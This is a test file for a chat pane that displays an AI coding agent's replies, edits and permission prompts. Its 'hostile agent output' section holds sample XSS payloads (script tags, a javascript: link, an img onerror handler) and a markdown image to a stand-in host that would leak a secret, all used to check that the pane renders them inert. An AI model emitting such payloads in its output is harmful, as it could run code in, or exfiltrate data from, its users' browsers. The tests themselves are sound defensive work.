// @vitest-environment jsdom
import { describe, it, expect, afterEach, beforeEach, vi } from 'vitest'
import { render, screen, cleanup, waitFor, fireEvent } from '@testing-library/react'
import type { AcpClientMessage, AcpEvent, AcpToolCall } from '@yaac/shared/acp'

/**
 * What the chat pane keeps across a teardown. A pane going off-screen stays
 * mounted, but one whose worktree stops — or whose tab is closed, or that a
 * reload takes with it — does not, so a draft held in component state would
 * simply vanish. The awkward case is the one where the draft is a message that
 * was already sent but not yet echoed back, which must NOT come back to haunt
 * the box.
 *
 * The ACP socket is mocked at the hook: everything below it is transport,
 * already covered by use-acp-stream.test.tsx, and none of it is what this
 * behavior turns on.
 */

const stream = {
  events: [] as AcpEvent[],
  busy: false,
  connected: true,
  send: vi.fn((_msg: AcpClientMessage) => true),
}

vi.mock('#lib/acp', () => ({ useAcpStream: () => stream }))

import { WorktreeChat } from '#components/WorktreeChat'
import { chatDraftKey, flushChatDrafts, useUiStore } from '#store'

const user = (seq: number, text: string): AcpEvent =>
  ({ type: 'user', seq, content: [{ type: 'text', text }] })

function box(): HTMLTextAreaElement {
  return screen.getByRole('textbox')
}

function type(text: string): void {
  fireEvent.change(box(), { target: { value: text } })
}

function show(worktreeId = 'w1', agentSessionId = 'acp-1'): ReturnType<typeof render> {
  return render(<WorktreeChat worktreeId={worktreeId} agentSessionId={agentSessionId} />)
}

describe('WorktreeChat drafts', () => {
  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('keeps a half-typed message when the pane is torn down and mounted again', async () => {
    show()
    type('the thing I was in the middle of')
    await waitFor(() =>
      expect(useUiStore.getState().chatDrafts[chatDraftKey('w1', 'acp-1')])
        .toEqual({ text: 'the thing I was in the middle of' }))

    cleanup()
    show()
    expect(box().value).toBe('the thing I was in the middle of')
  })

  it('keeps each conversation of a worktree separate', async () => {
    show('w1', 'acp-1')
    type('for the first agent')
    cleanup()

    show('w1', 'acp-2')
    expect(box().value).toBe('')
    type('for the second agent')
    cleanup()

    show('w1', 'acp-1')
    expect(box().value).toBe('for the first agent')
    await waitFor(() => expect(useUiStore.getState().chatDrafts).toEqual({
      [chatDraftKey('w1', 'acp-1')]: { text: 'for the first agent' },
      [chatDraftKey('w1', 'acp-2')]: { text: 'for the second agent' },
    }))
  })

  it('clears the box when the server echoes the message back', async () => {
    const { rerender } = show()
    type('ship it')
    fireEvent.click(screen.getByText('Send'))
    expect(stream.send).toHaveBeenCalledWith({ type: 'prompt', text: 'ship it' })
    // Handed to the socket, but not yet confirmed: the text is still there.
    expect(box().value).toBe('ship it')

    // The echo is what confirms delivery — and what empties the box.
    stream.events = [user(0, 'ship it')]
    rerender(<WorktreeChat worktreeId="w1" agentSessionId="acp-1" />)
    await waitFor(() => expect(box().value).toBe(''))
    expect(useUiStore.getState().chatDrafts).toEqual({})
  })

  it('drops a restored draft the conversation shows was delivered', async () => {
    // Sent, then navigated away before the echo landed: the message did arrive,
    // so the replayed history — not the pane's memory — has the last word.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'already sent')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'already sent')
    stream.events = [user(0, 'already sent')]
    show()
    await waitFor(() => expect(box().value).toBe(''))
    expect(useUiStore.getState().chatDrafts).toEqual({})
  })

  it('keeps a restored draft the conversation never received', async () => {
    // Same shape, but the socket dropped before the prompt got through: the
    // last thing the agent heard is something else, so the text stays put.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'never made it')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'never made it')
    stream.events = [user(0, 'an earlier message')]
    show()
    await waitFor(() => expect(box().value).toBe('never made it'))
  })

  it('keeps typed-but-unsent text that repeats what was already said', async () => {
    // The trap the `sent` marker exists for: short replies repeat. "ok" was
    // sent and answered; the user types "ok" again and leaves before sending.
    // Nothing was in flight, so history saying "the last thing you said was
    // ok" is not evidence about THIS text.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
    stream.events = [user(0, 'ok'), { type: 'agent', seq: 1, content: [{ type: 'text', text: 'done' }] }]
    show()
    await waitFor(() => expect(box().value).toBe('ok'))
  })

  it('keeps an edited draft even when the original send was delivered', async () => {
    // The message went out and arrived, but the box has been typed into since.
    // What it holds now is new work, whatever the history says.
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok')
    useUiStore.getState().setChatSent('w1', 'acp-1', 'ok')
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'ok, and one more thing')
    stream.events = [user(0, 'ok')]
    show()
    await waitFor(() => expect(box().value).toBe('ok, and one more thing'))
  })

  it('keeps a restored draft while the pane is still connecting', async () => {
    // Nothing to reconcile against until the replay lands — dropping the text
    // on a hunch would lose it outright.
    stream.connected = false
    useUiStore.getState().setChatDraft('w1', 'acp-1', 'unsent')
    show()
    await waitFor(() => expect(box().value).toBe('unsent'))
  })
})

/**
 * How the conversation reads. The agent writes markdown whether or not anyone
 * renders it, and its edits arrive as before/after pairs rather than prose —
 * so what is asserted here is that each kind of content is shown as the thing
 * it is, and that the one worth reading (an edit) is open without a click.
 */
describe('WorktreeChat rendering', () => {
  const agent = (seq: number, text: string): AcpEvent =>
    ({ type: 'agent', seq, content: [{ type: 'text', text }] })

  const toolCall = (seq: number, call: Partial<AcpToolCall> & { toolCallId: string }): AcpEvent => ({
    type: 'tool',
    seq,
    call: { title: 'Tool', kind: 'other', status: 'completed', ...call },
  })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('puts the user on the left, verbatim', () => {
    // Left like everything else — and literal: a user typing `**not bold**`
    // meant those asterisks.
    stream.events = [user(0, '**not bold**')]
    const { container } = show()
    expect(screen.getByText('**not bold**')).toBeTruthy()
    expect(container.querySelector('strong')).toBeNull()
    expect(container.querySelector('.justify-end')).toBeNull()
    expect(container.querySelector('.justify-start')).toBeTruthy()
  })

  it('renders the agent’s markdown as a document', () => {
    stream.events = [agent(0, '## Heading\n\nSome **bold** and `code`.\n\n- one\n- two\n')]
    const { container } = show()
    expect(container.querySelector('h2')?.textContent).toBe('Heading')
    expect(container.querySelector('strong')?.textContent).toBe('bold')
    expect(container.querySelector('code')?.textContent).toBe('code')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })

  it('renders a fenced block as highlighted code, without its backticks', () => {
    stream.events = [agent(0, 'run it:\n\n```ts\nconst x = 1\n```\n')]
    const { container } = show()
    const block = container.querySelector('pre code')
    expect(block?.textContent).toBe('const x = 1')
    expect(container.textContent).not.toContain('```')
    // Tokenized with the same classes the diff views use.
    expect(block?.querySelector('.tok-keyword')?.textContent).toBe('const')
  })

  it('renders a GFM table', () => {
    stream.events = [agent(0, '| a | b |\n| --- | --- |\n| 1 | 2 |\n')]
    const { container } = show()
    expect(container.querySelectorAll('th')).toHaveLength(2)
    expect(container.querySelectorAll('td')).toHaveLength(2)
  })

  it('shows an edit as a diff, expanded, without being asked', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', oldText: 'one\ntwo\n', newText: 'one\nTWO\n' }],
    })]
    const { container } = show()
    // Context kept as context; only the changed line is +/−.
    expect(screen.getByText('one')).toBeTruthy()
    expect(screen.getByText('two')).toBeTruthy()
    expect(screen.getByText('TWO')).toBeTruthy()
    expect(container.querySelector('.diff-hl')).toBeTruthy()
    // And the totals are on the row itself, so a collapsed one still says how
    // big the edit was.
    expect(screen.getByText('+1')).toBeTruthy()
    expect(screen.getByText('−1')).toBeTruthy()
  })

  it('lets the reader close an edit, and reopen it', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', newText: 'hello\n' }],
    })]
    const { container } = show()
    expect(screen.getByText('hello')).toBeTruthy()
    fireEvent.click(screen.getByText('Edit a.ts'))
    expect(container.querySelector('.diff-hl')).toBeNull()
    fireEvent.click(screen.getByText('Edit a.ts'))
    expect(screen.getByText('hello')).toBeTruthy()
  })

  it('opens an edit that only becomes one on a later update', () => {
    // A tool call arrives `pending` and empty, and grows its content as it
    // runs — so "is this an edit?" is not a question the first event answers.
    stream.events = [toolCall(0, { toolCallId: 't1', title: 'Edit a.ts', kind: 'edit', status: 'pending' })]
    const { container, rerender } = show()
    expect(container.querySelector('.diff-hl')).toBeNull()

    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit a.ts',
      kind: 'edit',
      content: [{ type: 'diff', path: '/workspace/a.ts', oldText: 'x', newText: 'y' }],
    })]
    rerender(<WorktreeChat worktreeId="w1" agentSessionId="acp-1" />)
    expect(container.querySelector('.diff-hl')).toBeTruthy()
  })

  it('leaves a non-edit tool call collapsed', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'ls',
      kind: 'execute',
      content: [{ type: 'text', text: '```console\na.ts\n```' }],
    })]
    show()
    expect(screen.queryByText('a.ts')).toBeNull()
    // Its output is markdown too: the fence the adapter wrapped stdout in is a
    // code block, not four backticks the user has to read past.
    fireEvent.click(screen.getByText('ls'))
    expect(screen.getByText('a.ts')).toBeTruthy()
    expect(screen.getByText('ls').closest('div')?.textContent).not.toContain('```')
  })

  it('shows a read as the file, highlighted for its path', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read a.ts',
      kind: 'read',
      locations: [{ path: '/workspace/a.ts' }],
      content: [{ type: 'text', text: '# not a heading\nconst x = 1\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read a.ts'))
    // Source, not prose: the `#` is a line of the file rather than a heading,
    // and the code is tokenized the way the diff views tokenize it.
    expect(container.querySelector('h1')).toBeNull()
    expect(container.querySelector('.diff-hl')?.textContent).toContain('# not a heading')
    expect(container.querySelector('.tok-keyword')?.textContent).toBe('const')
  })

  it('lifts a read’s line numbers into a gutter, out of the code', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read a.ts',
      kind: 'read',
      locations: [{ path: '/workspace/a.ts' }],
      // What an agent's file reader prints: a numbered gutter, and — for some
      // adapters — the whole thing inside a fence.
      content: [{ type: 'text', text: '```\n   7→const x = 1\n   8→\n   9→export {}\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read a.ts'))
    const block = container.querySelector('.diff-hl')
    expect(block?.textContent).toContain('const x = 1')
    expect(block?.textContent).toContain('export {}')
    // The numbers are the gutter, and are no longer in the code.
    expect([...container.querySelectorAll('.w-10')].map((e) => e.textContent)).toEqual(['7', '8', '9'])
    expect(block?.textContent).not.toContain('→')
    // Nor are the adapter's backticks part of the file.
    expect(container.textContent).not.toContain('```')
  })

  it('shows a read that named no file as code anyway', () => {
    // A read's body is a file's text whether or not the adapter said which
    // file. Without a path there is nothing to color it by — but it is still
    // the file's own lines, not a document to reinterpret.
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read something',
      kind: 'read',
      content: [{ type: 'text', text: '## not a heading\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read something'))
    expect(container.querySelector('h2')).toBeNull()
    expect(screen.getByText('## not a heading')).toBeTruthy()
  })

  it('keeps a markdown file’s own fences', () => {
    // Unwrapping a lone fence assumes the backticks are an adapter's wrapper.
    // For a `.md` that assumption is wrong often enough to drop: a document
    // whose body is one code sample would lose characters it really contains.
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read notes.md',
      kind: 'read',
      locations: [{ path: '/workspace/notes.md' }],
      content: [{ type: 'text', text: '```ts\nconst x = 1\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read notes.md'))
    expect(container.querySelector('.diff-hl')?.textContent).toContain('```ts')
  })

  it('takes a read’s language from the fence when it has no path', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Read it',
      kind: 'read',
      content: [{ type: 'text', text: '```python\nimport os\n```\n' }],
    })]
    const { container } = show()
    fireEvent.click(screen.getByText('Read it'))
    expect(container.querySelector('.tok-keyword')?.textContent).toBe('import')
  })

  it('names each file when one call edits several', () => {
    stream.events = [toolCall(0, {
      toolCallId: 't1',
      title: 'Edit files',
      kind: 'edit',
      content: [
        { type: 'diff', path: '/workspace/a.ts', newText: 'aaa\n' },
        { type: 'diff', path: '/workspace/b.ts', newText: 'bbb\n' },
      ],
    })]
    show()
    expect(screen.getByText('a.ts')).toBeTruthy()
    expect(screen.getByText('b.ts')).toBeTruthy()
  })
})

/**
 * What rendering agent prose as markup must never do.
 *
 * An agent's reply is written by a model that has been reading the repository,
 * so its text is untrusted input that happens to arrive in a friendly shape.
 * Everything below holds today because of a react-markdown default nobody
 * overrode — no `rehype-raw`, no `urlTransform` prop, no image fetching — and
 * a default is exactly the kind of invariant a one-line change removes in
 * silence. These are the assertions that make that change fail out loud.
 */
describe('WorktreeChat with hostile agent output', () => {
  const agent = (seq: number, text: string): AcpEvent =>
    ({ type: 'agent', seq, content: [{ type: 'text', text }] })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('leaves raw HTML in a reply inert', () => {
    stream.events = [agent(0, 'look:\n\n<script>window.pwned = 1</script>\n\n<b onclick="x()">hi</b>\n')]
    const { container } = show()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('b')).toBeNull()
    expect(container.querySelector('[onclick]')).toBeNull()
    // Not silently dropped either — it is shown as the text it is.
    expect(container.textContent).toContain('<script>')
  })

  it('neutralizes a javascript: link', () => {
    stream.events = [agent(0, '[click](javascript:alert(1))\n')]
    const { container } = show()
    const link = container.querySelector('a')
    expect(link?.textContent).toBe('click')
    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
  })

  it('shows a remote image as a link instead of fetching it', () => {
    // An `<img src>` is a request the browser makes on render, with no click —
    // which is a way out of the page for anything the URL encodes.
    stream.events = [agent(0, '![a caption](https://evil.example/pixel?leak=secret)\n')]
    const { container } = show()
    expect(container.querySelector('img')).toBeNull()
    expect(screen.getByText('a caption')).toBeTruthy()
  })

  it('keeps tool output that breaks out of its fence inside the same sandbox', () => {
    // The adapter wraps stdout in a ```console fence, and stdout can contain
    // triple backticks — so output becomes arbitrary markdown. That is allowed
    // to look odd; it is not allowed to reach the DOM.
    stream.events = [{
      type: 'tool',
      seq: 0,
      call: {
        toolCallId: 't1',
        title: 'cat evil.txt',
        kind: 'execute',
        status: 'completed',
        content: [{ type: 'text', text: '```console\n```\n\n<img src=x onerror="alert(1)">\n\n```\n' }],
      },
    }]
    const { container } = show()
    fireEvent.click(screen.getByText('cat evil.txt'))
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
  })
})

/**
 * The pane's half of an enforced permission mode. The agent is blocked until
 * one of these buttons is pressed, so what matters is that the question is
 * answerable, that the answer reaches the socket, and that the card retires on
 * the server's word rather than on the click.
 */
describe('WorktreeChat permission asks', () => {
  const ask = (seq: number, requestId = '5'): AcpEvent => ({
    type: 'permission-request',
    seq,
    requestId,
    toolCall: { toolCallId: 'c1', title: 'rm -rf build', kind: 'execute', status: 'pending' },
    options: [
      { optionId: 'no', name: 'Deny', kind: 'reject_once' },
      { optionId: 'allow', name: 'Allow Once', kind: 'allow_once' },
    ],
  })

  beforeEach(() => {
    stream.events = []
    stream.busy = false
    stream.connected = true
    stream.send.mockClear()
    stream.send.mockReturnValue(true)
    useUiStore.setState({ chatDrafts: {} })
  })

  afterEach(() => {
    cleanup()
    flushChatDrafts()
  })

  it('offers one button per option, over the call being asked about', () => {
    stream.events = [ask(0)]
    show()
    // The command itself, not a restatement of it: deciding needs the evidence.
    expect(screen.getByText('rm -rf build')).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Deny' })).toBeTruthy()
    expect(screen.getByRole('button', { name: 'Allow Once' })).toBeTruthy()
  })

  it('sends the chosen option and stops offering the rest', () => {
    stream.events = [ask(0)]
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Allow Once' }))

    expect(stream.send).toHaveBeenCalledWith({
      type: 'permission', requestId: '5', optionId: 'allow',
    })
    // The card stays until the server says so, but its buttons do not invite a
    // second answer while the first is in flight.
    expect(screen.getByRole('button', { name: 'Allow Once' })).toHaveProperty('disabled', true)
    expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', true)
  })

  it('sends a dismissal with no option, which the agent is told as cancelled', () => {
    stream.events = [ask(0)]
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Dismiss' }))
    expect(stream.send).toHaveBeenCalledWith({ type: 'permission', requestId: '5' })
  })

  it('re-offers the buttons when the answer never left a dead socket', () => {
    stream.events = [ask(0)]
    stream.send.mockReturnValue(false)
    show()
    fireEvent.click(screen.getByRole('button', { name: 'Deny' }))
    // Nothing on the far side heard it, so the question is still open.
    expect(screen.getByRole('button', { name: 'Deny' })).toHaveProperty('disabled', false)
  })

  it('collapses to the decision once the server reports it', () => {
    stream.events = [
      ask(0),
      { type: 'permission-resolved', seq: 1, requestId: '5', outcome: 'selected', optionId: 'allow' },
    ]
    show()
    expect(screen.queryByRole('button', { name: 'Allow Once' })).toBeNull()
    // Named rather than dropped, so a manual-mode transcript reads back as the
    // decisions that produced it.
    expect(screen.getByText(/Allow Once/)).toBeTruthy()
  })

  it('says the agent is waiting on the user rather than working', () => {
    // A blocked turn is `busy` — its prompt is unanswered — but "working…"
    // under the card asking the user to act is the one place that misreads.
    stream.events = [ask(0)]
    stream.busy = true
    show()
    expect(screen.queryByText('working…')).toBeNull()

    cleanup()
    stream.events = [
      ask(0),
      { type: 'permission-resolved', seq: 1, requestId: '5', outcome: 'selected', optionId: 'allow' },
    ]
    show()
    expect(screen.getByText('working…')).toBeTruthy()
  })
})
